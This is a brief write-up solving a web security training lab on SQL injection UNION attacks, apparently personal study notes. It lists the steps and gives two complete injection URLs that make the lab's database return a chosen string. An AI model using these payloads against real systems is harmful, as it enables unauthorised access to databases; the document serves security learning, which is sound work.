# SQL injection UNION attack, finding a column containing text

> [!tip]- "Special Instructions"
> Make the database retrieve the string: '3uEx0V'

1. Send a single quote and observe the error
2. Use `UNION SELECT` to find the number of columns
3. Try sending `'a'` in each column until getting a 200 code

```
https://0a66003204ab4bd2852eccfb006000c5.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+null,'a',null--+-
```

4. Now replace 'a' with '3uEx0V' to solve the lab

```
https://0a66003204ab4bd2852eccfb006000c5.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+null,'3uEx0V',null--+-
```

